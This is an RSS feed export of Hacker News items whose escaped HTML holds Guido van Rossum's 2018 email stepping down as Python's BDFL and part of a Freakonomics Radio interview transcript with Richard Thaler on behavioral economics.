<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>“I&amp;#039;m basically giving myself a permanent vacation from being BDFL”</title>
<link>https://mail.python.org/pipermail/python-committers/2018-July/005664.html</link>
<guid isPermaLink="true" >https://mail.python.org/pipermail/python-committers/2018-July/005664.html</guid>
<description>&lt;head&gt;&lt;title&gt;[python-committers] Transfer of power&lt;/title&gt;&lt;link rel=&quot;Index&quot; href=&quot;index.html&quot; /&gt;&lt;link rel=&quot;made&quot; href=&quot;mailto:python-committers%40python.org?Subject=Re%3A%20%5Bpython-committers%5D%20Transfer%20of%20power&amp;amp;In-Reply-To=%3CCAP7%2BvJ%2BoK5q8a3kxizcbgUrrhwhOBbDj9VhSSNwZ0XgiOuBztQ%40mail.gmail.com%3E&quot; /&gt;&lt;meta name=&quot;robots&quot; content=&quot;index,nofollow&quot; /&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;link rel=&quot;Previous&quot; href=&quot;005663.html&quot; /&gt;&lt;link rel=&quot;Next&quot; href=&quot;005666.html&quot; /&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#FFFFFF&quot; id=&quot;readabilityBody&quot; readability=&quot;34.350942002216&quot;&gt;

&lt;p&gt;&lt;strong&gt;Guido van Rossum&lt;/strong&gt; &lt;a href=&quot;mailto:python-committers%40python.org?Subject=Re%3A%20%5Bpython-committers%5D%20Transfer%20of%20power&amp;amp;In-Reply-To=%3CCAP7%2BvJ%2BoK5q8a3kxizcbgUrrhwhOBbDj9VhSSNwZ0XgiOuBztQ%40mail.gmail.com%3E&quot; title=&quot;[python-committers] Transfer of power&quot;&gt;guido at python.org&lt;/a&gt;&lt;br /&gt;&lt;em&gt;Thu Jul 12 10:57:35 EDT 2018&lt;/em&gt;&lt;/p&gt;
&lt;hr /&gt;&lt;pre&gt;
Now that PEP 572 is done, I don't ever want to have to fight so hard for a
PEP and find that so many people despise my decisions.

I would like to remove myself entirely from the decision process. I'll
still be there for a while as an ordinary core dev, and I'll still be
available to mentor people -- possibly more available. But I'm basically
giving myself a permanent vacation from being BDFL, and you all will be on
your own.

After all that's eventually going to happen regardless -- there's still
that bus lurking around the corner, and I'm not getting younger... (I'll
spare you the list of medical issues.)

I am not going to appoint a successor.

So what are you all going to do? Create a democracy? Anarchy? A
dictatorship? A federation?

I'm not worried about the day to day decisions in the issue tracker or on
GitHub. Very rarely I get asked for an opinion, and usually it's not
actually important. So this can just be dealt with as it has always been.

The decisions that most matter are probably
- How are PEPs decided
- How are new core devs inducted

We may be able to write up processes for these things as PEPs (maybe those
PEPs will form a kind of constitution). But here's the catch. I'm going to
try and let you all (the current committers) figure it out for yourselves.

Note that there's still the CoC -- if you don't like that document your
only option might be to leave this group voluntarily. Perhaps there are
issues to decide like when should someone be kicked out (this could be
banning people from python-dev or python-ideas too, since those are also
covered by the CoC).

Finally. A reminder that the archives of this list are public (
&lt;a href=&quot;https://mail.python.org/pipermail/python-committers/&quot;&gt;https://mail.python.org/pipermail/python-committers/&lt;/a&gt;) although membership
is closed (limited to core devs).

I'll still be here, but I'm trying to let you all figure something out for
yourselves. I'm tired, and need a very long break.

-- 
--Guido van Rossum (python.org/~guido)
-------------- next part --------------
An HTML attachment was scrubbed...
URL: &amp;lt;&lt;a href=&quot;http://mail.python.org/pipermail/python-committers/attachments/20180712/30a41d64/attachment-0001.html&quot;&gt;http://mail.python.org/pipermail/python-committers/attachments/20180712/30a41d64/attachment-0001.html&lt;/a&gt;&amp;gt;
&lt;/pre&gt;
&lt;hr /&gt;&lt;hr /&gt;&lt;p&gt;&lt;a href=&quot;https://mail.python.org/mailman/listinfo/python-committers&quot;&gt;More information about the python-committers mailing list&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
&lt;/body&gt;</description>
<pubDate>Thu, 12 Jul 2018 15:22:40 +0000</pubDate>
<dc:creator>randlet</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://mail.python.org/pipermail/python-committers/2018-July/005664.html</dc:identifier>
</item>
<item>
<title>People Aren’t Dumb, the World Is Hard</title>
<link>http://freakonomics.com/podcast/richard-thaler/</link>
<guid isPermaLink="true" >http://freakonomics.com/podcast/richard-thaler/</guid>
<description>&lt;div id=&quot;attachment_119520&quot; class=&quot;wp-caption alignleft&quot; readability=&quot;36.198275862069&quot;&gt;&lt;a href=&quot;http://freakonomics.com/wp-content/uploads/2018/07/38005093095_72c4ed76f3_k.jpg&quot;&gt;&lt;img class=&quot;wp-image-119520 size-thumbnail&quot; src=&quot;http://freakonomics.com/wp-content/uploads/2018/07/38005093095_72c4ed76f3_k-300x252.jpg&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;252&quot; srcset=&quot;http://freakonomics.com/wp-content/uploads/2018/07/38005093095_72c4ed76f3_k-300x252.jpg 300w, http://freakonomics.com/wp-content/uploads/2018/07/38005093095_72c4ed76f3_k-550x462.jpg 550w, http://freakonomics.com/wp-content/uploads/2018/07/38005093095_72c4ed76f3_k-1024x861.jpg 1024w, http://freakonomics.com/wp-content/uploads/2018/07/38005093095_72c4ed76f3_k-280x235.jpg 280w&quot; sizes=&quot;(max-width: 300px) 100vw, 300px&quot;/&gt;&lt;/a&gt;
&lt;p class=&quot;wp-caption-text&quot;&gt;Richard Thaler, father of behavioral economics, has been an irritant to mainstream economists. His research, about humans’ tendency to make suboptimal decisions, tarnishes their elegant economic models. (Photo: &lt;a href=&quot;https://www.flickr.com/photos/bnsd/38005093095&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Bengt Nyman&lt;/a&gt;/flickr)&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Our latest &lt;/em&gt;Freakonomics Radio &lt;em&gt;episode is called “People Aren’t Dumb. The World Is Hard.” (You can subscribe to the podcast at&lt;/em&gt; &lt;a href=&quot;https://itunes.apple.com/podcast/freakonomics-radio/id354668519&quot;&gt;&lt;em&gt;Apple Podcasts&lt;/em&gt;&lt;/a&gt;&lt;em&gt;,&lt;/em&gt; &lt;a href=&quot;http://www.stitcher.com/podcast/freakonomics-radio&quot;&gt;&lt;em&gt;Stitcher&lt;/em&gt;&lt;/a&gt;&lt;em&gt;, or&lt;/em&gt; &lt;a href=&quot;http://freakonomics.com/2014/07/24/a-podcast-users-guide-for-people-who-dont-use-itunes-or-iphones/&quot;&gt;&lt;em&gt;elsewhere&lt;/em&gt;&lt;/a&gt;&lt;em&gt;, get the&lt;/em&gt; &lt;a href=&quot;http://feeds.feedburner.com/freakonomicsradio&quot;&gt;&lt;em&gt;RSS feed&lt;/em&gt;&lt;/a&gt;&lt;em&gt;, or listen via the media player above.)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;You wouldn’t think you could win a Nobel Prize for showing that humans tend to make irrational decisions. But that’s what Richard Thaler has done. The founder of behavioral economics describes his unlikely route to success; his reputation for being lazy; and his efforts to fix the world — one nudge at a time.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Below is a transcript of the episode, modified for your reading pleasure. For more information on the people and ideas in the episode, see the links at the bottom of this post.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;*      *      *&lt;/p&gt;
&lt;blockquote readability=&quot;65.975651189128&quot;&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;Stephen J. DUBNER: So let’s begin. If you would, say your name and title.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;Richard THALER: I’m&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Richard_Thaler&quot;&gt;&lt;em&gt;&lt;span&gt;Richard Thaler&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;. I’m a professor at the Booth School of Business at the University of Chicago.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: I see, technically, you’re called the Charles R. Walgreen Distinguished Service Professor of Behavioral Sciences, blah, blah, blah. Is that accurate?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Yeah, that’s accurate, but I didn’t want to take up the whole podcast with my title.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: I understand. I was curious, however, I guess it’s an endowed chair, is that what that is?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Yeah. In fact, it’s a chair that has only been held by three people, all of whom have won a certain prize.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Interesting. More important, though, I want to know, as it’s bestowed by the Walgreen family, does the position come with a discount at Walgreens drugstores?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: There is no discount that I’ve been informed of.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: That said, you — and I guess the other two holders of said chair — you are about a million-plus dollars richer since you were last on the show, because I understand that you went out and won a Nobel Prize, and that they give you some money with that.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Now that you mention that, I won that prize in spite of your best efforts to prevent it. I think the show owes me an apology. Like, on the air.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: This is sore winner-dom we’re seeing. You win the Nobel Prize, having been on our show previously, talking about potentially winning the Nobel Prize, and yet somehow you’re sour about our theoretically negative influence, when in fact the outcome was positive? What kind of logic is that?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well no, but it’s not the interview with me. It was the interview with&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://www.chicagobooth.edu/faculty/directory/s/per-stromberg&quot;&gt;&lt;em&gt;&lt;span&gt;Per Stromberg&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;, where you outed me. I’m sure you guys can find the tape.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;Yeah. We found the tape:&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;Per STROMBERG: So I’m actually not allowed to talk so much about what happens.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;The episode was called “&lt;/span&gt;&lt;a href=&quot;http://freakonomics.com/podcast/how-to-win-a-nobel-prize-a-new-freakonomics-radio-episode/&quot;&gt;&lt;span&gt;How to Win a Nobel Prize&lt;/span&gt;&lt;/a&gt;&lt;span&gt;.” Per Stromberg is on&lt;/span&gt; &lt;a href=&quot;https://www.nobelprize.org/nobel_prizes/economic-sciences/prize_awarder/committee.html&quot;&gt;&lt;span&gt;the committee that awards the economics prize&lt;/span&gt;&lt;/a&gt;&lt;span&gt;. As he pointed out, he couldn’t say&lt;/span&gt; &lt;span&gt;too&lt;/span&gt; &lt;span&gt;much about the secret process. But, he said, his committee was very reliant on the reports they commissioned on potential winners.&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;53.073108709472&quot;&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;STROMBERG: Our goal is to keep on scanning the field of economic sciences broadly speaking, and to keep this up to date, we continuously send out these reports, basically scanning the field. So these are super-helpful, and they’re sent to really top people in these fields who put a lot of work into these reports. So this is probably our most important input.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: And those reports remain confidential for 50 years, correct?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;STROMBERG: Exactly.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: So Richard Thaler tells me that he was asked many years ago to write a report — he was commissioned to write a report on the work of&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Daniel_Kahneman&quot;&gt;&lt;em&gt;&lt;span&gt;Daniel Kahneman&lt;/span&gt;&lt;/em&gt;&lt;/a&gt; &lt;em&gt;&lt;span&gt;and&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://en.wikipedia.org/wiki/Amos_Tversky&quot;&gt;&lt;em&gt;&lt;span&gt;Amos Tversky&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;, who —&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: — You described me, revealing I had written a long report on my friends Kahneman and Tversky back in the 1980’s. And you told Per I had told you that, and I think his words were, “Oh, he shouldn’t have done that.”&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;STROMBERG: I’m not sure he was allowed to say that, but fine.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Okay, well, that’s his problem, not mine.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: The show owes me an apology for trying to block my slim chances and drive them to zero.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Well, let me ask you just to entertain the counterfactual. Maybe it made that Nobel committee think, “Oh, that Thaler, he’s his own man. He identifies what he thinks are important ideas and he feels it’s important to disseminate them even at personal risk to himself,” and because —&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: You know, it would be a line you could have used. I was holding off on the lawsuit until it was clear I hadn’t won, but I think you’re safe now, Steve, so we can move beyond this.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;And move beyond this we shall.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;*      *      *&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Years ago, Richard Thaler became enthralled with a new line of research about decision-making by the psychologists Amos Tversky and Danny Kahneman. Thaler went on to collaborate with them, thereby helping to create the field now known as behavioral economics.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;To mainstream economists, Thaler’s research was often an irritant. He insisted that the elegant models they used to describe human economic activity were in fact grotesquely inelegant — because they failed to factor in how real humans actually think and decide and behave. Over time, however, Thaler’s work came to be tolerated, if not outright accepted. Along the way, he wrote a few books, including&lt;/span&gt; &lt;a href=&quot;https://www.amazon.com/gp/product/039335279X/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;amp;tag=freakonomic08-20&amp;amp;creative=9325&amp;amp;linkCode=as2&amp;amp;creativeASIN=039335279X&amp;amp;linkId=2688e44805071d53e11953b1ee15ed63&quot;&gt;&lt;em&gt;&lt;span&gt;Misbehaving: The Making of Behavioral Economics&lt;/span&gt;&lt;/em&gt;&lt;/a&gt; &lt;span&gt;and&lt;/span&gt; &lt;a href=&quot;https://www.amazon.com/gp/product/014311526X/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;amp;tag=freakonomic08-20&amp;amp;creative=9325&amp;amp;linkCode=as2&amp;amp;creativeASIN=014311526X&amp;amp;linkId=f7987d31c1cd75f3ba2a3c8275155614&quot;&gt;&lt;em&gt;&lt;span&gt;Nudge: Improving Decisions About Health, Wealth, and Happiness&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Today, governments around the world are running so-called Nudge units, hoping to harness the simple power of Thaler’s ideas in the pursuit of better outcomes in health, education, personal finance, and crime reduction. Many other institutions and firms are practicing what Thaler has been preaching, often to quite substantial success. If Kahneman and Tversky were the architects of this behavior revolution, Richard Thaler was the man who turned their sketches into something we could actually inhabit.&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;184.40422850742&quot;&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: I have a lot of questions for you today. And we also solicited listener and reader questions. So we’ll toss them in as we go. Here’s one from Jose Albino Sanchez. He’s an economics major who graduated from Notre Dame in 2016. So: congratulations. He wants to know, “How did you, Richard Thaler, use your behavioral-economics research to not run away with the $1 million-plus prize money of the Nobel Prize and go buy a Ferrari?” And I should say, that’s assuming you didn’t do that. But I, like Jose, am curious how you used your behavioral knowledge to spend or not spend your money.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, every Nobel winner, I think, is asked this question: “What are you going to do with the money?!” And they asked me this at 4:45 in the morning. The routine is, you get this call at 4:00 a.m. Chicago time, and once they’ve convinced you this is not a prank, they say, “Okay, get ready. There’s a press conference in 45 minutes.” And I hopped in the shower, and then I’m on a press conference and the first question is, “What are you going to do with the money?” And all I could think of was, “Well, to an economist this is a silly question, an impossible question.”&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: To most economists perhaps.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, certainly to a non-behavioral economist, it’s a silly question.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Because the answer would be, “It just goes into the pool with the other money. It’s no different than any other.” Is that why?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Right. The proceeds of that money, half of which will end up in the U.S. Treasury, are sitting in some account at Vanguard. And if I go out for a fancy dinner, there’s no way for me to label that “Nobel money.” Though that might be a fun thing to do. I’ve thought that maybe the hedonically optimal way to spend the money would be to get a special credit card, the Nobel credit card. And then when I decide to buy a ridiculously expensive set of golf clubs, hoping that that will turn me into a competent golfer, then I just whip out the Nobel card — that might be a good idea.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Now, I’m curious. You do believe — and in fact helped identify — the notion that we think of as mental accounting, which I know that the smart people tell you you shouldn’t do. You shouldn’t set aside money for vacation or for a certain project, because money is fungible. That’s one of the beauties of money. And yet, as you discovered, many people do it. And, you also argued, it’s not such a bad idea. Or, at least, since so many people do it, we should figure out how to deal with it. But is there a cookie jar on the counter where you’ve got the half a million that you can dip into whenever you want to do something fun?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Yeah. That would be a really good idea, especially —&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: And what’s your address, by the way?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Especially if we announce it on the radio!&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: But why just stick it in Vanguard, where it just becomes more dollars mixed in with the others?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, I’ve been busy, Steve, you’re getting me to think about labeling it. And, of course, maybe we should figure out what percentage, maybe all, should go to some cause. That would make me feel good, too.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: If there were a cause, can you tell us just the general outlines of the cause? Would it be poverty alleviation?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: You know, I greatly admire&lt;/span&gt;&lt;/em&gt; &lt;a href=&quot;https://donate.doctorswithoutborders.org/onetime.cfm&quot;&gt;&lt;em&gt;&lt;span&gt;Doctors Without Borders&lt;/span&gt;&lt;/em&gt;&lt;/a&gt;&lt;em&gt;&lt;span&gt;. And they are one of the causes that we support. But I haven’t really figured out what my personal cause is.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Now, let me ask you this. Your wife, France, you’ve been married quite a while. I don’t know how much credit you give her for being part of the familial team that produced this Nobel Prize. If you were to divide the prize, how do you think about divvying that up?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: First you try to prevent me from winning the Nobel Prize. Now you try to break up my marriage, Steve. You know, I used to think of you as a friend. I would say that France should get 120 percent of the after-tax money.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Good answer.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: And you should get -20 percent. And I think that would be a great solution.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: Early in your academic career — and I hope you don’t mind me saying this — it didn’t appear as if you were destined for huge distinction in your field.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: I think that’s fair.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: The undergraduate and graduate schools you went to aren’t quite elite. Your place in the economic firmament was hardly guaranteed. So what happened? How’d that guy get to here?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: So, you’re right. I don’t think I was — well, I certainly wasn’t a great student. And I don’t think I was a great economist, in the way economists are usually judged, in the sense that I wasn’t a great mathematician and my econometrics skills were not superb. Suppose there was an economics combine, like the N.F.L. combine, and they did all the stats on Thaler. No one would have drafted him. And so what I really ended up having to do to survive — and this sounds premeditated, and of course it wasn’t — was to figure out a kind of way of doing economics that would be something I was good at. And had I not done that, I might well have not gotten tenure and gone off and maybe I would be competing with you in book writing.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: You’ve summed up behavioral economics as a collection of “supposedly irrelevant factors that, when it comes to how people actually live their lives, are in fact not irrelevant.” Can you give an example?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Sure. One of the first things that I noticed back when I was a graduate student puzzling through the behavior I saw, was that people don’t follow the economists’ advice to ignore sunk costs. If you paid for some expensive, rich dessert and after one bite you were already full, and your waistline doesn’t really need it, but you remember how much you paid for it, and so you think you need to eat it, following all kinds of mothers’ bad advice to finish what’s on your plate – then you are failing to follow the economist’s advice of ignoring that money, because eating it doesn’t get the money back.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;So, sunk costs are something that economists predict will have no effect on behavior. And there are a class of these supposedly irrelevant factors. In fact, it’s almost the only set of things about which economists have precise predictions. Consider supply and demand. If the price goes up, people will demand less. Well, how much less? “Oh sorry, the theory doesn’t specify that.” All it says is: less. Whereas here, sunk costs will matter precisely zero.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: So says the theory, at least.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Says the theory, right.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: In reality, you’re saying they matter a great deal.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Right. That’s why I call them supposedly irrelevant factors. Another example is default options, which box is ticked on a form. Again, according to economic theory, the cost of clicking the other box is infinitesimal. And yet we know that making enrollment in a retirement plan the default option increases enrollment rates to over 90 percent. And so again, economists would predict confidently that that would have a zero effect, and it has a massive effect.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;In an earlier episode of this podcast, called “&lt;/span&gt;&lt;a href=&quot;http://freakonomics.com/podcast/launch-behavior-change-revolution/&quot;&gt;&lt;span&gt;How to Launch a Behavior-Change Revolution&lt;/span&gt;&lt;/a&gt;&lt;span&gt;,” we heard Danny Kahneman — who won his own Nobel Prize in 2002 — describe the history of behavioral economics. He pointed out something that distinguished Richard Thaler from many other economists.&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;233.0347705146&quot;&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;Daniel KAHNEMAN: Now, Richard, he hates my saying the next two things I’ll say about him. One of them I think he would tolerate. I think he’s a genius. That one he accepts. I think he’s lazy. I’ve made him famous for being lazy.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: You’ve been accused — or really, praised — by your collaborator and mentor and friend Danny Kahneman as being extremely lazy, and furthermore he argues that laziness has in fact been a big part of your success. What does he mean by that, and should we all try to be a little bit lazier?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Well, I don’t know whether I can recommend laziness. Danny insists in great earnestness that this was intended as a compliment. He described it as my best feature. And I object to that. I concede some laziness, but that being my best feature? Really, Danny?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;So I think what he means is that — at least I’m going to interpret it this way — that I have little patience for working on things that aren’t, at least to me, both interesting and somewhat important. And so compared to too many economists or academics, I haven’t written a super large number of papers, and I don’t follow the habit of writing 20 versions of the same paper, or on the same topic, because I get bored. And the fourth paper on some topic is not nearly as interesting as the first one. So Danny claims that it’s my laziness that forces me to work on things that are important rather than unimportant. And that’s his story, anyway.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: And the mechanism of that benefit is what? Because you’re lazy, you just don’t want to waste time on things that aren’t going to be potentially important and/or interesting?&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;THALER: Yeah, that’s the idea.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;DUBNER: So, I hate to inject our personal history in this, but it does bring up a memory. I remember coming to visit you in Chicago. I think it was the first time we met. And it was probably 15, 16 years ago, and I had really fallen hard for this whole behavioral idea, the Kahneman/Tversky, and Thaler, and I liked the economics. I especially liked the psychology. And I came to you and I said, “Herr Professor Thaler, I — a young and ambitious journalist at&lt;/span&gt;&lt;/em&gt; &lt;span&gt;The New York Times&lt;/span&gt; &lt;em&gt;&lt;span&gt;— would be most interested in writing a book that incorporates your research and incorporates your own view of the world, and I’d love to include you in it as some kind of collaborator, subject,” so on.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;span&gt;And if I recall correctly — I’m just curious to know what your recollection is — you basically said, “That sounds like a lot of work. And I’ve got other stuff going on, so I’ll buy you lunch but then, scram.” That was my recollection. And I’ve always been disappointed that we never worked on a book together. I’m curious if that squares with your recollection.&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
